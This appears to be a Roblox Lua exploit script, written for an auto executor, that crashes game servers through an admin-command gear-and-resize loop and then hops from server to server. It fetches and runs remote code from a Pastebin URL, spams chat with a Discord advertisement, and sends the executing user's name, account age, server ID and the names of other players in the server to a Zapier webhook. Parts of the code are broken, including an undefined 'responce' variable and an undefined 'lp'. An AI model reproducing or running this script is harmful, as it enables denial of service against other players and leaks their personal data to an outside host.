-- Made by exprvssed
-- Make sure to put this in your auto executor
-- if it doesnt teleport instantly, this means all servers have been crashed or are full. Just wait a while

task.wait(2.2)
if not game:IsLoaded() then -- Self Explanotory
    while wait() do
        local http = game:GetService "HttpService"
        local function jsond(str)
            return http:JSONDecode(str)
        end

        local response
        local suc, er =
            pcall(
            function()
                local req =
                    game:HttpGet(
                    "https://games.roblox.com/v1/games/" ..
                        tostring(game.PlaceId) .. "/servers/Public?sortOrder=Asc&limit=100"
                )
                response = game:GetService("HttpService"):JSONDecode(responce)
            end
        )
        if suc and response then
            for _, server in pairs(http) do
                if game.JobId ~= server.id then -- / You don't want to rejoin the same server.
                    if server.Playing ~= server.maxPlayers then
                        game:GetService("TeleportService"):TeleportToPlaceInstance(
                            game.PlaceId,
                            server.id,
                            game:GetService("Players").LocalPlayer
                        )
                        break
                    end
                end
            end
        elseif er then
            print(er)
        else
            print("http returned nil")
        end
    end
end
-- Variables:
local plrs = game:GetService("Players")
local http = game:GetService "HttpService"
local plr = plrs.LocalPlayer
local nm = plr.Name
local char = plr.Character
local rs = game:getService("RunService")
local url = "https://hooks.zapier.com/hooks/catch/11054705/btiq4ps/" -- If you can see this, I trust you lol hope I don't regret that
local cmsg = nm .. " Crashed Server: " .. game.JobId .. "  Players: "

-- functions:
local function c(msg)
    game:service "ReplicatedStorage".DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end

local function web(ps, gs)
    function jsone(str)
        return http:JSONEncode(str)
    end
    function sendData(webhook)
        local users = {}
        for i, v in pairs(plrs:GetPlayers()) do
            users[#users + 1] = v.Name
        end
        users = table.concat(users, "\n")
        local Data = {
            ["username"] = "Crash Logger",
            ["content"] = gs,
            ["embeds"] = {
                {
                    ["author"] = {
                        ["name"] = "Profile",
                        ["url"] = "https://www.roblox.com/users/" .. plr.UserId .. "/profile"
                    },
                    ["title"] = plr.Name,
                    ["color"] = 12583126,
                    ["fields"] = {
                        {
                            ["name"] = "Server ID",
                            ["value"] = game.JobId,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Age",
                            ["value"] = plr.AccountAge,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Co-Users",
                            ["value"] = users,
                            ["inline"] = false
                        }
                    }
                }
            }
        }
        game:HttpPost(url, game:HttpPost(url, game:GetService("HttpService"):JSONEncode(Data)))
    end
    sendData(ps)
end
loadstring(game:HttpGet(("https://pastebin.com/raw/bSjbj2td"), true))() -- This loads the auto pad commands, needed for non perms

pcall(
    function()
        -- Incase Regen doesn't exist
        local regen = game.Workspace.Terrain["_Game"].Admin.Regen
    end
)

plrs:Chat(".pads")
plrs:Chat("unsize all")
plrs:Chat("unpunish me")
pcall(
    function()
        -- msgs:
        c("<Bot.txt> This Server Has Been Crashed By AgsDestroyer")
        task.wait(.35)
        c("<Bot.txt> Join Discourd for more!")
        task.wait(.35)
        c("<Bot.txt> gg/9Y63Vuf8")
        task.wait()

        local charadd = -- Shades Crash
            lp.CharacterAdded:Connect(
            function(char)
                plrs:Chat("gear me 94794847")
                local vamp = lp.Backpack:WaitForChild("VampireVanquisher", .4)
                if vamp then
                    local hum = char:WaitForChild("Humanoid", .4)
                    if not hum then
                        plrs:Chat("respawn me")
                        return
                    else
                        hum:EquipTool(vamp)
                    end
                    local yield = char:WaitForChild("VampireVanquisher", .5)
                    if not yield then
                        plrs:Chat("respawn me")
                        task.wait(.2)
                        plrs:Chat("gear me 94794847")
                        return
                    end
                    --Maybe add a wait() here if it is too fast
                    for i = 1, 4 do
                        plrs:Chat("size me .3")
                    end
                else
                    plrs:Chat("respawn me")
                end
            end
        )
    end
) -- ends pcall

wait(.1)
web(cmsg, "User executed") -- send webhook

while wait() do
    while wait() do
        local http = game:GetService "HttpService"
        local function jsond(str)
            return http:JSONDecode(str)
        end

        local response
        local suc, er =
            pcall(
            function()
                local req =
                    game:HttpGet(
                    "https://games.roblox.com/v1/games/" ..
                        tostring(game.PlaceId) .. "/servers/Public?sortOrder=Asc&limit=100"
                )
                response = game:GetService("HttpService"):JSONDecode(responce)
            end
        )
        if suc and response then
            for _, server in pairs(http) do
                if game.JobId ~= server.id then -- / You don't want to rejoin the same server.
                    if server.Playing ~= server.maxPlayers then
                        game:GetService("TeleportService"):TeleportToPlaceInstance(
                            game.PlaceId,
                            server.id,
                            game:GetService("Players").LocalPlayer
                        )
                        break
                    end
                end
            end
        elseif er then
            print(er)
        else
            print("http returned nil")
        end
    end
end
